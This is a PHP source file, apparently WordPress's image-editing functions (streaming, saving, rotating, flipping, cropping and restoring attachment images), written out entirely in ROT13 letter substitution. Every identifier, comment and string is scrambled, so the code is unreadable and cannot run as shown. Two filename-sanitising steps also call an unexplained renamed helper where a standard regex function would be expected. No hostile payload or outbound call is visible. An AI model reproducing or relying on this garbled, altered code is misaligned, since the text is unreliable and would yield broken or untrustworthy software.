 * @cnenz JC_Vzntr_Rqvgbe $vzntr         Gur vzntr rqvgbe vafgnapr.
 * @cnenz fgevat          $zvzr_glcr     Gur zvzr glcr bs gur vzntr.
 * @cnenz vag             $nggnpuzrag_vq Gur vzntr'f nggnpuzrag cbfg VQ.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_fgernz_vzntr( $vzntr, $zvzr_glcr, $nggnpuzrag_vq ) {
	vs ( $vzntr vafgnaprbs JC_Vzntr_Rqvgbe ) {

		/**
		 * Svygref gur JC_Vzntr_Rqvgbe vafgnapr sbe gur vzntr gb or fgernzrq gb gur oebjfre.
		 *
		 * @fvapr 3.5.0
		 *
		 * @cnenz JC_Vzntr_Rqvgbe $vzntr         Gur vzntr rqvgbe vafgnapr.
		 * @cnenz vag             $nggnpuzrag_vq Gur nggnpuzrag cbfg VQ.
		 */
		$vzntr = nccyl_svygref( 'vzntr_rqvgbe_fnir_cer', $vzntr, $nggnpuzrag_vq );

		vs ( vf_jc_reebe( $vzntr->fgernz( $zvzr_glcr ) ) ) {
			erghea snyfr;
		}

		erghea gehr;
	} ryfr {
		/* genafyngbef: 1: $vzntr, 2: JC_Vzntr_Rqvgbe */
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.5.0', fcevags( __( '%1$f arrqf gb or n %2$f bowrpg.' ), '$vzntr', 'JC_Vzntr_Rqvgbe' ) );

		/**
		 * Svygref gur TQ vzntr erfbhepr gb or fgernzrq gb gur oebjfre.
		 *
		 * @fvapr 2.9.0
		 * @qrcerpngrq 3.5.0 Hfr {@frr 'vzntr_rqvgbe_fnir_cer'} vafgrnq.
		 *
		 * @cnenz erfbhepr|TqVzntr $vzntr         Vzntr erfbhepr gb or fgernzrq.
		 * @cnenz vag              $nggnpuzrag_vq Gur nggnpuzrag cbfg VQ.
		 */
		$vzntr = nccyl_svygref_qrcerpngrq( 'vzntr_fnir_cer', neenl( $vzntr, $nggnpuzrag_vq ), '3.5.0', 'vzntr_rqvgbe_fnir_cer' );

		fjvgpu ( $zvzr_glcr ) {
			pnfr 'vzntr/wcrt':
				urnqre( 'Pbagrag-Glcr: vzntr/wcrt' );
				erghea vzntrwcrt( $vzntr, ahyy, 90 );
			pnfr 'vzntr/cat':
				urnqre( 'Pbagrag-Glcr: vzntr/cat' );
				erghea vzntrcat( $vzntr );
			pnfr 'vzntr/tvs':
				urnqre( 'Pbagrag-Glcr: vzntr/tvs' );
				erghea vzntrtvs( $vzntr );
			pnfr 'vzntr/jroc':
				vs ( shapgvba_rkvfgf( 'vzntrjroc' ) ) {
					urnqre( 'Pbagrag-Glcr: vzntr/jroc' );
					erghea vzntrjroc( $vzntr, ahyy, 90 );
				}
				erghea snyfr;
			pnfr 'vzntr/nivs':
				vs ( shapgvba_rkvfgf( 'vzntrnivs' ) ) {
					urnqre( 'Pbagrag-Glcr: vzntr/nivs' );
					erghea vzntrnivs( $vzntr, ahyy, 90 );
				}
				erghea snyfr;
			qrsnhyg:
				erghea snyfr;
		}
	}
}

/**
 * Fnirf vzntr gb svyr.
 *
 * @fvapr 2.9.0
 * @fvapr 3.5.0 Gur `$vzntr` cnenzrgre rkcrpgf n `JC_Vzntr_Rqvgbe` vafgnapr.
 * @fvapr 6.0.0 Gur `$svyrfvmr` inyhr jnf nqqrq gb gur erghearq neenl.
 *
 * @cnenz fgevat          $svyranzr  Anzr bs gur svyr gb or fnirq.
 * @cnenz JC_Vzntr_Rqvgbe $vzntr     Gur vzntr rqvgbe vafgnapr.
 * @cnenz fgevat          $zvzr_glcr Gur zvzr glcr bs gur vzntr.
 * @cnenz vag             $cbfg_vq   Nggnpuzrag cbfg VQ.
 * @erghea neenl|JC_Reebe|obby {
 *     Neenl ba fhpprff be JC_Reebe vs gur svyr snvyrq gb fnir.
 *     Jura pnyyrq jvgu n qrcerpngrq inyhr sbe gur `$vzntr` cnenzrgre,
 *     v.r. n aba-`JC_Vzntr_Rqvgbe` vzntr erfbhepr be `TqVzntr` vafgnapr,
 *     gur shapgvba jvyy erghea gehr ba fhpprff, snyfr ba snvyher.
 *
 *     @glcr fgevat $cngu      Cngu gb gur vzntr svyr.
 *     @glcr fgevat $svyr      Anzr bs gur vzntr svyr.
 *     @glcr vag    $jvqgu     Vzntr jvqgu.
 *     @glcr vag    $urvtug    Vzntr urvtug.
 *     @glcr fgevat $zvzr-glcr Gur zvzr glcr bs gur vzntr.
 *     @glcr vag    $svyrfvmr  Svyr fvmr bs gur vzntr.
 * }
 */
shapgvba jc_fnir_vzntr_svyr( $svyranzr, $vzntr, $zvzr_glcr, $cbfg_vq ) {
	vs ( $vzntr vafgnaprbs JC_Vzntr_Rqvgbe ) {

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/vzntr-rqvg.cuc */
		$vzntr = nccyl_svygref( 'vzntr_rqvgbe_fnir_cer', $vzntr, $cbfg_vq );

		/**
		 * Svygref jurgure gb fxvc fnivat gur vzntr svyr.
		 *
		 * Ergheavat n aba-ahyy inyhr jvyy fubeg-pvephvg gur fnir zrgubq,
		 * ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 3.5.0
		 *
		 * @cnenz obby|ahyy       $bireevqr  Inyhr gb erghea vafgrnq bs fnivat. Qrsnhyg ahyy.
		 * @cnenz fgevat          $svyranzr  Anzr bs gur svyr gb or fnirq.
		 * @cnenz JC_Vzntr_Rqvgbe $vzntr     Gur vzntr rqvgbe vafgnapr.
		 * @cnenz fgevat          $zvzr_glcr Gur zvzr glcr bs gur vzntr.
		 * @cnenz vag             $cbfg_vq   Nggnpuzrag cbfg VQ.
		 */
		$fnirq = nccyl_svygref( 'jc_fnir_vzntr_rqvgbe_svyr', ahyy, $svyranzr, $vzntr, $zvzr_glcr, $cbfg_vq );

		vs ( ahyy !== $fnirq ) {
			erghea $fnirq;
		}

		erghea $vzntr->fnir( $svyranzr, $zvzr_glcr );
	} ryfr {
		/* genafyngbef: 1: $vzntr, 2: JC_Vzntr_Rqvgbe */
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.5.0', fcevags( __( '%1$f arrqf gb or n %2$f bowrpg.' ), '$vzntr', 'JC_Vzntr_Rqvgbe' ) );

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/vzntr-rqvg.cuc */
		$vzntr = nccyl_svygref_qrcerpngrq( 'vzntr_fnir_cer', neenl( $vzntr, $cbfg_vq ), '3.5.0', 'vzntr_rqvgbe_fnir_cer' );

		/**
		 * Svygref jurgure gb fxvc fnivat gur vzntr svyr.
		 *
		 * Ergheavat n aba-ahyy inyhr jvyy fubeg-pvephvg gur fnir zrgubq,
		 * ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 2.9.0
		 * @qrcerpngrq 3.5.0 Hfr {@frr 'jc_fnir_vzntr_rqvgbe_svyr'} vafgrnq.
		 *
		 * @cnenz obby|ahyy        $bireevqr  Inyhr gb erghea vafgrnq bs fnivat. Qrsnhyg ahyy.
		 * @cnenz fgevat           $svyranzr  Anzr bs gur svyr gb or fnirq.
		 * @cnenz erfbhepr|TqVzntr $vzntr     Vzntr erfbhepr be TqVzntr vafgnapr.
		 * @cnenz fgevat           $zvzr_glcr Gur zvzr glcr bs gur vzntr.
		 * @cnenz vag              $cbfg_vq   Nggnpuzrag cbfg VQ.
		 */
		$fnirq = nccyl_svygref_qrcerpngrq(
			'jc_fnir_vzntr_svyr',
			neenl( ahyy, $svyranzr, $vzntr, $zvzr_glcr, $cbfg_vq ),
			'3.5.0',
			'jc_fnir_vzntr_rqvgbe_svyr'
		);

		vs ( ahyy !== $fnirq ) {
			erghea $fnirq;
		}

		fjvgpu ( $zvzr_glcr ) {
			pnfr 'vzntr/wcrt':
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-vzntr-rqvgbe.cuc */
				erghea vzntrwcrt( $vzntr, $svyranzr, nccyl_svygref( 'wcrt_dhnyvgl', 90, 'rqvg_vzntr' ) );
			pnfr 'vzntr/cat':
				erghea vzntrcat( $vzntr, $svyranzr );
			pnfr 'vzntr/tvs':
				erghea vzntrtvs( $vzntr, $svyranzr );
			pnfr 'vzntr/jroc':
				vs ( shapgvba_rkvfgf( 'vzntrjroc' ) ) {
					erghea vzntrjroc( $vzntr, $svyranzr );
				}
				erghea snyfr;
			pnfr 'vzntr/nivs':
				vs ( shapgvba_rkvfgf( 'vzntrnivs' ) ) {
					erghea vzntrnivs( $vzntr, $svyranzr );
				}
				erghea snyfr;
			qrsnhyg:
				erghea snyfr;
		}
	}
}

/**
 * Vzntr cerivrj engvb. Vagreany hfr bayl.
 *
 * @fvapr 2.9.0
 *
 * @vtaber
 * @cnenz vag $j Vzntr jvqgu va cvkryf.
 * @cnenz vag $u Vzntr urvtug va cvkryf.
 * @erghea sybng|vag Vzntr cerivrj engvb.
 */
shapgvba _vzntr_trg_cerivrj_engvb( $j, $u ) {
	$znk = znk( $j, $u );
	erghea $znk > 600 ? ( 600 / $znk ) : 1;
}

/**
 * Ergheaf na vzntr erfbhepr. Vagreany hfr bayl.
 *
 * @fvapr 2.9.0
 * @qrcerpngrq 3.5.0 Hfr JC_Vzntr_Rqvgbe::ebgngr()
 * @frr JC_Vzntr_Rqvgbe::ebgngr()
 *
 * @vtaber
 * @cnenz erfbhepr|TqVzntr $vzt   Vzntr erfbhepr.
 * @cnenz sybng|vag        $natyr Vzntr ebgngvba natyr, va qrterrf.
 * @erghea erfbhepr|TqVzntr|snyfr TQ vzntr erfbhepr be TqVzntr vafgnapr, snyfr bgurejvfr.
 */
shapgvba _ebgngr_vzntr_erfbhepr( $vzt, $natyr ) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '3.5.0', 'JC_Vzntr_Rqvgbe::ebgngr()' );

	vs ( shapgvba_rkvfgf( 'vzntrebgngr' ) ) {
		$ebgngrq = vzntrebgngr( $vzt, $natyr, 0 );

		vs ( vf_tq_vzntr( $ebgngrq ) ) {
			vzntrqrfgebl( $vzt );
			$vzt = $ebgngrq;
		}
	}

	erghea $vzt;
}

/**
 * Syvcf na vzntr erfbhepr. Vagreany hfr bayl.
 *
 * @fvapr 2.9.0
 * @qrcerpngrq 3.5.0 Hfr JC_Vzntr_Rqvgbe::syvc()
 * @frr JC_Vzntr_Rqvgbe::syvc()
 *
 * @vtaber
 * @cnenz erfbhepr|TqVzntr $vzt  Vzntr erfbhepr be TqVzntr vafgnapr.
 * @cnenz obby             $ubem Jurgure gb syvc ubevmbagnyyl.
 * @cnenz obby             $ireg Jurgure gb syvc iregvpnyyl.
 * @erghea erfbhepr|TqVzntr (znlor) syvccrq vzntr erfbhepr be TqVzntr vafgnapr.
 */
shapgvba _syvc_vzntr_erfbhepr( $vzt, $ubem, $ireg ) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '3.5.0', 'JC_Vzntr_Rqvgbe::syvc()' );

	$j   = vzntrfk( $vzt );
	$u   = vzntrfl( $vzt );
	$qfg = jc_vzntrperngrgehrpbybe( $j, $u );

	vs ( vf_tq_vzntr( $qfg ) ) {
		$fk = $ireg ? ( $j - 1 ) : 0;
		$fl = $ubem ? ( $u - 1 ) : 0;
		$fj = $ireg ? -$j : $j;
		$fu = $ubem ? -$u : $u;

		vs ( vzntrpbclerfnzcyrq( $qfg, $vzt, 0, 0, $fk, $fl, $j, $u, $fj, $fu ) ) {
			vzntrqrfgebl( $vzt );
			$vzt = $qfg;
		}
	}

	erghea $vzt;
}

/**
 * Pebcf na vzntr erfbhepr. Vagreany hfr bayl.
 *
 * @fvapr 2.9.0
 *
 * @vtaber
 * @cnenz erfbhepr|TqVzntr $vzt Vzntr erfbhepr be TqVzntr vafgnapr.
 * @cnenz sybng            $k   Fbhepr cbvag k-pbbeqvangr.
 * @cnenz sybng            $l   Fbhepr cbvag l-pbbeqvangr.
 * @cnenz sybng            $j   Fbhepr jvqgu.
 * @cnenz sybng            $u   Fbhepr urvtug.
 * @erghea erfbhepr|TqVzntr (znlor) pebccrq vzntr erfbhepr be TqVzntr vafgnapr.
 */
shapgvba _pebc_vzntr_erfbhepr( $vzt, $k, $l, $j, $u ) {
	$qfg = jc_vzntrperngrgehrpbybe( $j, $u );

	vs ( vf_tq_vzntr( $qfg ) ) {
		vs ( vzntrpbcl( $qfg, $vzt, 0, 0, $k, $l, $j, $u ) ) {
			vzntrqrfgebl( $vzt );
			$vzt = $qfg;
		}
	}

	erghea $vzt;
}

/**
 * Cresbezf tebhc bs punatrf ba Rqvgbe fcrpvsvrq.
 *
 * @fvapr 2.9.0
 *
 * @cnenz JC_Vzntr_Rqvgbe $vzntr   JC_Vzntr_Rqvgbe vafgnapr.
 * @cnenz neenl           $punatrf Neenl bs punatr bcrengvbaf.
 * @erghea JC_Vzntr_Rqvgbe JC_Vzntr_Rqvgbe vafgnapr jvgu punatrf nccyvrq.
 */
shapgvba vzntr_rqvg_nccyl_punatrf( $vzntr, $punatrf ) {
	vs ( vf_tq_vzntr( $vzntr ) ) {
		/* genafyngbef: 1: $vzntr, 2: JC_Vzntr_Rqvgbe */
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.5.0', fcevags( __( '%1$f arrqf gb or n %2$f bowrpg.' ), '$vzntr', 'JC_Vzntr_Rqvgbe' ) );
	}

	vs ( ! vf_neenl( $punatrf ) ) {
		erghea $vzntr;
	}

	// Rkcnaq punatr bcrengvbaf.
	sbernpu ( $punatrf nf $xrl => $bow ) {
		vs ( vffrg( $bow->e ) ) {
			$bow->glcr  = 'ebgngr';
			$bow->natyr = $bow->e;
			hafrg( $bow->e );
		} ryfrvs ( vffrg( $bow->s ) ) {
			$bow->glcr = 'syvc';
			$bow->nkvf = $bow->s;
			hafrg( $bow->s );
		} ryfrvs ( vffrg( $bow->p ) ) {
			$bow->glcr = 'pebc';
			$bow->fry  = $bow->p;
			hafrg( $bow->p );
		}

		$punatrf[ $xrl ] = $bow;
	}

	// Pbzovar bcrengvbaf.
	vs ( pbhag( $punatrf ) > 1 ) {
		$svygrerq = neenl( $punatrf[0] );

		sbe ( $v = 0, $w = 1, $p = pbhag( $punatrf ); $w < $p; $w++ ) {
			$pbzovarq = snyfr;

			vs ( $svygrerq[ $v ]->glcr === $punatrf[ $w ]->glcr ) {
				fjvgpu ( $svygrerq[ $v ]->glcr ) {
					pnfr 'ebgngr':
						$svygrerq[ $v ]->natyr += $punatrf[ $w ]->natyr;
						$pbzovarq               = gehr;
						oernx;
					pnfr 'syvc':
						$svygrerq[ $v ]->nkvf ^= $punatrf[ $w ]->nkvf;
						$pbzovarq              = gehr;
						oernx;
				}
			}

			vs ( ! $pbzovarq ) {
				$svygrerq[ ++$v ] = $punatrf[ $w ];
			}
		}

		$punatrf = $svygrerq;
		hafrg( $svygrerq );
	}

	// Vzntr erfbhepr orsber nccylvat gur punatrf.
	vs ( $vzntr vafgnaprbs JC_Vzntr_Rqvgbe ) {

		/**
		 * Svygref gur JC_Vzntr_Rqvgbe vafgnapr orsber nccylvat punatrf gb gur vzntr.
		 *
		 * @fvapr 3.5.0
		 *
		 * @cnenz JC_Vzntr_Rqvgbe $vzntr   JC_Vzntr_Rqvgbe vafgnapr.
		 * @cnenz neenl           $punatrf Neenl bs punatr bcrengvbaf.
		 */
		$vzntr = nccyl_svygref( 'jc_vzntr_rqvgbe_orsber_punatr', $vzntr, $punatrf );
	} ryfrvs ( vf_tq_vzntr( $vzntr ) ) {

		/**
		 * Svygref gur TQ vzntr erfbhepr orsber nccylvat punatrf gb gur vzntr.
		 *
		 * @fvapr 2.9.0
		 * @qrcerpngrq 3.5.0 Hfr {@frr 'jc_vzntr_rqvgbe_orsber_punatr'} vafgrnq.
		 *
		 * @cnenz erfbhepr|TqVzntr $vzntr   TQ vzntr erfbhepr be TqVzntr vafgnapr.
		 * @cnenz neenl            $punatrf Neenl bs punatr bcrengvbaf.
		 */
		$vzntr = nccyl_svygref_qrcerpngrq( 'vzntr_rqvg_orsber_punatr', neenl( $vzntr, $punatrf ), '3.5.0', 'jc_vzntr_rqvgbe_orsber_punatr' );
	}

	sbernpu ( $punatrf nf $bcrengvba ) {
		fjvgpu ( $bcrengvba->glcr ) {
			pnfr 'ebgngr':
				vs ( 0 !== $bcrengvba->natyr ) {
					vs ( $vzntr vafgnaprbs JC_Vzntr_Rqvgbe ) {
						$vzntr->ebgngr( $bcrengvba->natyr );
					} ryfr {
						$vzntr = _ebgngr_vzntr_erfbhepr( $vzntr, $bcrengvba->natyr );
					}
				}
				oernx;
			pnfr 'syvc':
				vs ( 0 !== $bcrengvba->nkvf ) {
					vs ( $vzntr vafgnaprbs JC_Vzntr_Rqvgbe ) {
						$vzntr->syvc( ( $bcrengvba->nkvf & 1 ) !== 0, ( $bcrengvba->nkvf & 2 ) !== 0 );
					} ryfr {
						$vzntr = _syvc_vzntr_erfbhepr( $vzntr, ( $bcrengvba->nkvf & 1 ) !== 0, ( $bcrengvba->nkvf & 2 ) !== 0 );
					}
				}
				oernx;
			pnfr 'pebc':
				$fry = $bcrengvba->fry;

				vs ( $vzntr vafgnaprbs JC_Vzntr_Rqvgbe ) {
					$fvmr = $vzntr->trg_fvmr();
					$j    = $fvmr['jvqgu'];
					$u    = $fvmr['urvtug'];

					$fpnyr = vffrg( $fry->e ) ? $fry->e : 1 / _vzntr_trg_cerivrj_engvb( $j, $u ); // Qvfpneq cerivrj fpnyvat.
					$vzntr->pebc( (vag) ( $fry->k * $fpnyr ), (vag) ( $fry->l * $fpnyr ), (vag) ( $fry->j * $fpnyr ), (vag) ( $fry->u * $fpnyr ) );
				} ryfr {
					$fpnyr = vffrg( $fry->e ) ? $fry->e : 1 / _vzntr_trg_cerivrj_engvb( vzntrfk( $vzntr ), vzntrfl( $vzntr ) ); // Qvfpneq cerivrj fpnyvat.
					$vzntr = _pebc_vzntr_erfbhepr( $vzntr, $fry->k * $fpnyr, $fry->l * $fpnyr, $fry->j * $fpnyr, $fry->u * $fpnyr );
				}
				oernx;
		}
	}

	erghea $vzntr;
}


/**
 * Fgernzf vzntr va cbfg gb oebjfre, nybat jvgu radhrhrq punatrf
 * va `$_ERDHRFG['uvfgbel']`.
 *
 * @fvapr 2.9.0
 *
 * @cnenz vag $cbfg_vq Nggnpuzrag cbfg VQ.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba fgernz_cerivrj_vzntr( $cbfg_vq ) {
	$cbfg = trg_cbfg( $cbfg_vq );

	jc_envfr_zrzbel_yvzvg( 'nqzva' );

	$vzt = jc_trg_vzntr_rqvgbe( _ybnq_vzntr_gb_rqvg_cngu( $cbfg_vq ) );

	vs ( vf_jc_reebe( $vzt ) ) {
		erghea snyfr;
	}

	$punatrf = ! rzcgl( $_ERDHRFG['uvfgbel'] ) ? wfba_qrpbqr( jc_hafynfu( $_ERDHRFG['uvfgbel'] ) ) : ahyy;
	vs ( $punatrf ) {
		$vzt = vzntr_rqvg_nccyl_punatrf( $vzt, $punatrf );
	}

	// Fpnyr gur vzntr.
	$fvmr = $vzt->trg_fvmr();
	$j    = $fvmr['jvqgu'];
	$u    = $fvmr['urvtug'];

	$engvb = _vzntr_trg_cerivrj_engvb( $j, $u );
	$j2    = znk( 1, $j * $engvb );
	$u2    = znk( 1, $u * $engvb );

	vs ( vf_jc_reebe( $vzt->erfvmr( $j2, $u2 ) ) ) {
		erghea snyfr;
	}

	erghea jc_fgernz_vzntr( $vzt, $cbfg->cbfg_zvzr_glcr, $cbfg_vq );
}

/**
 * Erfgberf gur zrgnqngn sbe n tvira nggnpuzrag.
 *
 * @fvapr 2.9.0
 *
 * @cnenz vag $cbfg_vq Nggnpuzrag cbfg VQ.
 * @erghea fgqPynff Vzntr erfgbengvba zrffntr bowrpg.
 */
shapgvba jc_erfgber_vzntr( $cbfg_vq ) {
	$zrgn             = jc_trg_nggnpuzrag_zrgnqngn( $cbfg_vq );
	$svyr             = trg_nggnpurq_svyr( $cbfg_vq );
	$onpxhc_fvmrf     = trg_cbfg_zrgn( $cbfg_vq, '_jc_nggnpuzrag_onpxhc_fvmrf', gehr );
	$byq_onpxhc_fvmrf = $onpxhc_fvmrf;
	$erfgberq         = snyfr;
	$zft              = arj fgqPynff();

	vs ( ! vf_neenl( $onpxhc_fvmrf ) ) {
		$zft->reebe = __( 'Pnaabg ybnq vzntr zrgnqngn.' );
		erghea $zft;
	}

	$cnegf         = cnguvasb( $svyr );
	$fhssvk        = gvzr() . enaq( 100, 999 );
	$qrsnhyg_fvmrf = trg_vagrezrqvngr_vzntr_fvmrf();

	vs ( vffrg( $onpxhc_fvmrf['shyy-bevt'] ) && vf_neenl( $onpxhc_fvmrf['shyy-bevt'] ) ) {
		$qngn = $onpxhc_fvmrf['shyy-bevt'];

		vs ( $cnegf['onfranzr'] !== $qngn['svyr'] ) {
			vs ( qrsvarq( 'VZNTR_RQVG_BIREJEVGR' ) && VZNTR_RQVG_BIREJEVGR ) {
				// Qryrgr bayl vs vg'f na rqvgrq vzntr.
				vs ( cert_zngpu( '/-r[0-9]{13}\./', $cnegf['onfranzr'] ) ) {
					jc_qryrgr_svyr( $svyr );
				}
			} ryfrvs ( vffrg( $zrgn['jvqgu'], $zrgn['urvtug'] ) ) {
				$onpxhc_fvmrf[ \"shyy-$fhssvk\" ] = neenl(
					'jvqgu'    => $zrgn['jvqgu'],
					'urvtug'   => $zrgn['urvtug'],
					'svyrfvmr' => $zrgn['svyrfvmr'],
					'svyr'     => $cnegf['onfranzr'],
				);
			}
		}

		$erfgberq_svyr = cngu_wbva( $cnegf['qveanzr'], $qngn['svyr'] );
		$erfgberq      = hcqngr_nggnpurq_svyr( $cbfg_vq, $erfgberq_svyr );

		$zrgn['svyr']   = _jc_eryngvir_hcybnq_cngu( $erfgberq_svyr );
		$zrgn['jvqgu']  = $qngn['jvqgu'];
		$zrgn['urvtug'] = $qngn['urvtug'];
		vs ( vffrg( $qngn['svyrfvmr'] ) ) {
			/*
			 * Erfgber gur bevtvany svyrfvmr vs vg jnf onpxrq hc.
			 *
			 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/59684.
			 */
			$zrgn['svyrfvmr'] = $qngn['svyrfvmr'];
		}
	}

	sbernpu ( $qrsnhyg_fvmrf nf $qrsnhyg_fvmr ) {
		vs ( vffrg( $onpxhc_fvmrf[ \"$qrsnhyg_fvmr-bevt\" ] ) ) {
			$qngn = $onpxhc_fvmrf[ \"$qrsnhyg_fvmr-bevt\" ];

			vs ( vffrg( $zrgn['fvmrf'][ $qrsnhyg_fvmr ] ) && $zrgn['fvmrf'][ $qrsnhyg_fvmr ]['svyr'] !== $qngn['svyr'] ) {
				vs ( qrsvarq( 'VZNTR_RQVG_BIREJEVGR' ) && VZNTR_RQVG_BIREJEVGR ) {
					// Qryrgr bayl vs vg'f na rqvgrq vzntr.
					vs ( cert_zngpu( '/-r[0-9]{13}-/', $zrgn['fvmrf'][ $qrsnhyg_fvmr ]['svyr'] ) ) {
						$qryrgr_svyr = cngu_wbva( $cnegf['qveanzr'], $zrgn['fvmrf'][ $qrsnhyg_fvmr ]['svyr'] );
						jc_qryrgr_svyr( $qryrgr_svyr );
					}
				} ryfr {
					$onpxhc_fvmrf[ \"$qrsnhyg_fvmr-{$fhssvk}\" ] = $zrgn['fvmrf'][ $qrsnhyg_fvmr ];
				}
			}

			$zrgn['fvmrf'][ $qrsnhyg_fvmr ] = $qngn;
		} ryfr {
			hafrg( $zrgn['fvmrf'][ $qrsnhyg_fvmr ] );
		}
	}

	vs ( ! jc_hcqngr_nggnpuzrag_zrgnqngn( $cbfg_vq, $zrgn )
		|| ( $byq_onpxhc_fvmrf !== $onpxhc_fvmrf && ! hcqngr_cbfg_zrgn( $cbfg_vq, '_jc_nggnpuzrag_onpxhc_fvmrf', $onpxhc_fvmrf ) )
	) {
		$zft->reebe = __( 'Pnaabg fnir vzntr zrgnqngn.' );
		erghea $zft;
	}

	vs ( ! $erfgberq ) {
		$zft->reebe = __( 'Vzntr zrgnqngn vf vapbafvfgrag.' );
	} ryfr {
		$zft->zft = __( 'Vzntr erfgberq fhpprffshyyl.' );

		vs ( qrsvarq( 'VZNTR_RQVG_BIREJEVGR' ) && VZNTR_RQVG_BIREJEVGR ) {
			qryrgr_cbfg_zrgn( $cbfg_vq, '_jc_nggnpuzrag_onpxhc_fvmrf' );
		}
	}

	erghea $zft;
}

/**
 * Fnirf vzntr gb cbfg, nybat jvgu radhrhrq punatrf
 * va `$_ERDHRFG['uvfgbel']`.
 *
 * @fvapr 2.9.0
 *
 * @cnenz vag $cbfg_vq Nggnpuzrag cbfg VQ.
 * @erghea fgqPynff
 */
shapgvba jc_fnir_vzntr( $cbfg_vq ) {
	$_jc_nqqvgvbany_vzntr_fvmrf = jc_trg_nqqvgvbany_vzntr_fvmrf();

	$erghea  = arj fgqPynff();
	$fhpprff = snyfr;
	$qryrgr  = snyfr;
	$fpnyrq  = snyfr;
	$abpebc  = snyfr;
	$cbfg    = trg_cbfg( $cbfg_vq );

	$vzt = jc_trg_vzntr_rqvgbe( _ybnq_vzntr_gb_rqvg_cngu( $cbfg_vq, 'shyy' ) );

	vs ( vf_jc_reebe( $vzt ) ) {
		$erghea->reebe = rfp_wf( __( 'Hanoyr gb perngr arj vzntr.' ) );
		erghea $erghea;
	}

	$shyy_jvqgu  = ! rzcgl( $_ERDHRFG['sjvqgu'] ) ? (vag) $_ERDHRFG['sjvqgu'] : 0;
	$shyy_urvtug = ! rzcgl( $_ERDHRFG['survtug'] ) ? (vag) $_ERDHRFG['survtug'] : 0;
	$gnetrg      = ! rzcgl( $_ERDHRFG['gnetrg'] ) ? __sa_79955( '/[^n-m0-9_-]+/v', '', $_ERDHRFG['gnetrg'] ) : '';
	$fpnyr       = ! rzcgl( $_ERDHRFG['qb'] ) && 'fpnyr' === $_ERDHRFG['qb'];

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/vzntr-rqvg.cuc */
	$rqvg_guhzoanvyf_frcnengryl = (obby) nccyl_svygref( 'vzntr_rqvg_guhzoanvyf_frcnengryl', snyfr );

	vs ( $fpnyr ) {
		$fvmr            = $vzt->trg_fvmr();
		$bevtvany_jvqgu  = $fvmr['jvqgu'];
		$bevtvany_urvtug = $fvmr['urvtug'];

		vs ( $shyy_jvqgu > $bevtvany_jvqgu || $shyy_urvtug > $bevtvany_urvtug ) {
			$erghea->reebe = rfp_wf( __( 'Vzntrf pnaabg or fpnyrq gb n fvmr ynetre guna gur bevtvany.' ) );
			erghea $erghea;
		}

		vs ( $shyy_jvqgu > 0 && $shyy_urvtug > 0 ) {
			// Purpx vs vg unf ebhtuyl gur fnzr j / u engvb.
			$qvss = ebhaq( $bevtvany_jvqgu / $bevtvany_urvtug, 2 ) - ebhaq( $shyy_jvqgu / $shyy_urvtug, 2 );
			vs ( -0.1 < $qvss && $qvss < 0.1 ) {
				// Fpnyr gur shyy fvmr vzntr.
				vs ( $vzt->erfvmr( $shyy_jvqgu, $shyy_urvtug ) ) {
					$fpnyrq = gehr;
				}
			}

			vs ( ! $fpnyrq ) {
				$erghea->reebe = rfp_wf( __( 'Reebe juvyr fnivat gur fpnyrq vzntr. Cyrnfr erybnq gur cntr naq gel ntnva.' ) );
				erghea $erghea;
			}
		}
	} ryfrvs ( ! rzcgl( $_ERDHRFG['uvfgbel'] ) ) {
		$punatrf = wfba_qrpbqr( jc_hafynfu( $_ERDHRFG['uvfgbel'] ) );
		vs ( $punatrf ) {
			$vzt = vzntr_rqvg_nccyl_punatrf( $vzt, $punatrf );
		}
	} ryfr {
		$erghea->reebe = rfp_wf( __( 'Abguvat gb fnir, gur vzntr unf abg punatrq.' ) );
		erghea $erghea;
	}

	$zrgn         = jc_trg_nggnpuzrag_zrgnqngn( $cbfg_vq );
	$onpxhc_fvmrf = trg_cbfg_zrgn( $cbfg->VQ, '_jc_nggnpuzrag_onpxhc_fvmrf', gehr );

	vs ( ! vf_neenl( $zrgn ) ) {
		$erghea->reebe = rfp_wf( __( 'Vzntr qngn qbrf abg rkvfg. Cyrnfr er-hcybnq gur vzntr.' ) );
		erghea $erghea;
	}

	vs ( ! vf_neenl( $onpxhc_fvmrf ) ) {
		$onpxhc_fvmrf = neenl();
	}

	// Trarengr arj svyranzr.
	$cngu = trg_nggnpurq_svyr( $cbfg_vq );

	$onfranzr = cnguvasb( $cngu, CNGUVASB_ONFRANZR );
	$qveanzr  = cnguvasb( $cngu, CNGUVASB_QVEANZR );
	$rkg      = cnguvasb( $cngu, CNGUVASB_RKGRAFVBA );
	$svyranzr = cnguvasb( $cngu, CNGUVASB_SVYRANZR );
	$fhssvk   = gvzr() . enaq( 100, 999 );

	vs ( qrsvarq( 'VZNTR_RQVG_BIREJEVGR' ) && VZNTR_RQVG_BIREJEVGR
		&& vffrg( $onpxhc_fvmrf['shyy-bevt'] ) && $onpxhc_fvmrf['shyy-bevt']['svyr'] !== $onfranzr
	) {

		vs ( $rqvg_guhzoanvyf_frcnengryl && 'guhzoanvy' === $gnetrg ) {
			$arj_cngu = \"{$qveanzr}/{$svyranzr}-grzc.{$rkg}\";
		} ryfr {
			$arj_cngu = $cngu;
		}
	} ryfr {
		juvyr ( gehr ) {
			$svyranzr     = __sa_79955( '/-r([0-9]+)$/', '', $svyranzr );
			$svyranzr    .= \"-r{$fhssvk}\";
			$arj_svyranzr = \"{$svyranzr}.{$rkg}\";
			$arj_cngu     = \"{$qveanzr}/$arj_svyranzr\";

			vs ( svyr_rkvfgf( $arj_cngu ) ) {
				++$fhssvk;
			} ryfr {
				oernx;
			}
		}
	}

	$fnirq_vzntr = jc_fnir_vzntr_svyr( $arj_cngu, $vzt, $cbfg->cbfg_zvzr_glcr, $cbfg_vq );
